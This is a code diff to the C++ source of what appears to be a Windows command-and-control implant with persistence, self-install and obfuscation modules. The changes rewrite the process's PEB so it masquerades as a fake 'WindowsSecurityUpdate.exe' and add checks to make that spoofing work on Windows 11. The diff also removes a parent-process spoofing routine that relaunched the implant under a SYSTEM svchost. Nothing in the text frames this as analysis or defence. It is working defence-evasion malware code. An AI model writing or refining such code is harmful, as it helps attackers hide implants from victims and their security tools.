@@ -8,7 +8,6 @@
 #include "c2.hpp"
 #include "utils.hpp"
 #include "persistence.hpp"
-#include "injection.hpp"
 #include "obfuscate.hpp"
 #include <string>
 
@@ -178,30 +177,32 @@ static void SpoofPEB() {
 #endif
     if (!peb || !peb->ProcessParameters) return;
 
-    // Target spoof: svchost.exe running under a common service
+    // Spoof as a Microsoft Windows Update helper — runs from its own installed path
     static wchar_t fakePath[] =
-        L"C:\\Windows\\System32\\svchost.exe";
+        L"C:\\Windows\\System32\\WindowsSecurityUpdate.exe";
     static wchar_t fakeCmd[] =
-        L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule";
+        L"C:\\Windows\\System32\\WindowsSecurityUpdate.exe";
 
     auto& ip  = peb->ProcessParameters->ImagePathName;
     auto& cmd = peb->ProcessParameters->CommandLine;
 
-    DWORD old = 0;
-    VirtualProtect(ip.Buffer,  ip.MaximumLength,  PAGE_READWRITE, &old);
-    VirtualProtect(cmd.Buffer, cmd.MaximumLength, PAGE_READWRITE, &old);
+    DWORD old1 = 0, old2 = 0;
+    // Only proceed if VirtualProtect succeeds — on Win11 these may be read-only
+    bool ipOk  = VirtualProtect(ip.Buffer,  ip.MaximumLength,  PAGE_READWRITE, &old1) != 0;
+    bool cmdOk = VirtualProtect(cmd.Buffer, cmd.MaximumLength, PAGE_READWRITE, &old2) != 0;
 
-    // Write fake strings — lengths must not exceed original buffer
     USHORT pathBytes = static_cast<USHORT>(wcslen(fakePath) * sizeof(wchar_t));
     USHORT cmdBytes  = static_cast<USHORT>(wcslen(fakeCmd)  * sizeof(wchar_t));
 
-    if (pathBytes <= ip.MaximumLength) {
-        memcpy(ip.Buffer,  fakePath, pathBytes);
+    if (ipOk && pathBytes <= ip.MaximumLength) {
+        memcpy(ip.Buffer, fakePath, pathBytes);
         ip.Length = pathBytes;
+        VirtualProtect(ip.Buffer, ip.MaximumLength, old1, &old1);
     }
-    if (cmdBytes <= cmd.MaximumLength) {
+    if (cmdOk && cmdBytes <= cmd.MaximumLength) {
         memcpy(cmd.Buffer, fakeCmd, cmdBytes);
         cmd.Length = cmdBytes;
+        VirtualProtect(cmd.Buffer, cmd.MaximumLength, old2, &old2);
     }
 }
 
@@ -300,22 +301,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (!SelfInstall()) {
         if (hGlobalMutex) CloseHandle(hGlobalMutex);
         return 0;
-    }
-
-    // ── PPID spoofing: relaunch under a SYSTEM svchost parent ─────────────
-    // Release the mutex BEFORE spawning so the child can acquire it.
-    // TryRespawnUnderSvchost checks if we're already parented to svchost;
-    // if so it returns false and we continue as the real beacon process.
-    if (hGlobalMutex) { CloseHandle(hGlobalMutex); hGlobalMutex = nullptr; }
-    if (TryRespawnUnderSvchost()) return 0;
-    // Re-acquire for the running instance that continues as the beacon.
-    {
-        std::wstring mutexName = BuildMutexName();
-        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
-        if (GetLastError() == ERROR_ALREADY_EXISTS) {
-            if (hGlobalMutex) CloseHandle(hGlobalMutex);
-            return 0;
-        }
     }
 
     DBG("===== WinMain pid=%lu elevated=%d =====",
